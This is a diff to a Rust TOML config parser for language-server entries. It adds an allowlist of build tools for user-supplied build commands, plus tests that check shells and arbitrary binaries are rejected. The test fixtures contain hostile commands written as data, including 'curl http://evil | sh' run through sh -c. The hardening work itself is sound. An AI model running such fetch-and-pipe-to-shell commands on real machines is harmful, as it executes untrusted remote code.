@@ -255,6 +255,8 @@ impl ServerSpec {
     ///
     /// `PATH` 键（大小写不敏感，Windows 环境变量语义）按平台分隔符追加在原值后
     /// —— `Command::envs` 是覆盖语义，此处需显式带原值拼接；其余键直接设置。
+    /// 本函数是全仓唯一的 PATH 合并点（bd 4gz / audit-secdesign S6）：builtin 与
+    /// external 条目的 env 都经此出口，注入面收敛在「原 PATH 优先、用户目录垫后」。
     pub fn spawn_env(&self) -> Vec<(String, String)> {
         let Some(env) = &self.env else {
             return Vec::new();
@@ -287,6 +289,15 @@ pub fn parse(toml_str: &str) -> Result<ServersToml, String> {
     }
     Ok(parsed)
 }
+
+/// source.build_cmd 首元素白名单（bd 4gz / audit-secdesign S6）。external-servers.toml
+/// 是用户可写文件，install=source 的 build_cmd 会在本机执行——首元素限定知名
+/// 构建/包管理工具（不含任何 shell），防用户目录被投放恶意 toml 后拉起任意命令。
+const BUILD_CMD_ALLOWLIST: &[&str] = &[
+    "cargo", "rustc", "make", "cmake", "meson", "ninja", "nix", "npm", "pnpm", "yarn", "node",
+    "go", "zig", "bazel", "python", "python3", "pip", "pip3", "dotnet", "cabal", "stack",
+    "shards", "crystal", "dub", "haxe", "gradle", "mvn",
+];
 
 /// 必填字段交叉校验（design §2：install 类别决定子表存在性）。
 fn validate(id: &str, spec: &ServerSpec) -> Result<(), String> {
@@ -387,6 +398,17 @@ fn validate(id: &str, spec: &ServerSpec) -> Result<(), String> {
             if s.build_cmd.is_empty() || s.build_cmd[0].is_empty() {
                 return Err(format!(
                     "[servers.{id}].source.build_cmd must list at least the program name"
+                ));
+            }
+            // S6（bd 4gz）：build_cmd 在本机 clone 根执行，首元素不得是 shell 或
+            // 任意可执行名——白名单限定知名构建/包管理工具（大小写不敏感、忽略
+            // .exe 后缀）。需要非常规构建的 LS 时改用 path_only 条目登记现成二进制。
+            let prog = s.build_cmd[0].to_lowercase();
+            let prog = prog.strip_suffix(".exe").unwrap_or(&prog);
+            if !BUILD_CMD_ALLOWLIST.contains(&prog) {
+                return Err(format!(
+                    "[servers.{id}].source.build_cmd[0] `{}` is not a known build tool (allowlist: cargo/make/cmake/meson/ninja/nix/npm/go/python/dotnet/cabal/shards/...); use a path_only entry pointing at the prebuilt binary instead",
+                    s.build_cmd[0]
                 ));
             }
             if s.bin_rel.is_empty() {
@@ -733,10 +755,51 @@ bin_rel = "b"
 "#,
                 "build_cmd must list at least the program name",
             ),
+            (
+                // S6：shell 不在白名单。
+                r#"
+[servers.broken]
+languages = ["x"]
+install = "source"
+[servers.broken.source]
+repo = "https://github.com/x/y"
+build_cmd = ["sh", "-c", "curl http://evil | sh"]
+bin_rel = "b"
+"#,
+                "not a known build tool",
+            ),
+            (
+                // S6：白名单外的任意二进制名同样拒收。
+                r#"
+[servers.broken]
+languages = ["x"]
+install = "source"
+[servers.broken.source]
+repo = "https://github.com/x/y"
+build_cmd = ["curl", "http://evil"]
+bin_rel = "b"
+"#,
+                "not a known build tool",
+            ),
         ] {
             let err = parse(toml).unwrap_err();
             assert!(err.contains(needle), "want `{needle}` in err: {err}");
         }
+    }
+
+    /// S6（bd 4gz）：白名单大小写不敏感 + 忽略 .exe 后缀；白名单内构建工具放行。
+    #[test]
+    fn source_build_cmd_allowlist_normalizes_case_and_exe_suffix() {
+        let toml = r#"
+[servers.ok]
+languages = ["x"]
+install = "source"
+[servers.ok.source]
+repo = "https://github.com/x/y"
+build_cmd = ["NIX.EXE", "build"]
+bin_rel = "b"
+"#;
+        assert!(parse(toml).is_ok(), "NIX.EXE 归一后 = nix，应在白名单内");
     }
 
     // ---- 上游对拍采纳 Wave 1：T0 三通道字段 ----
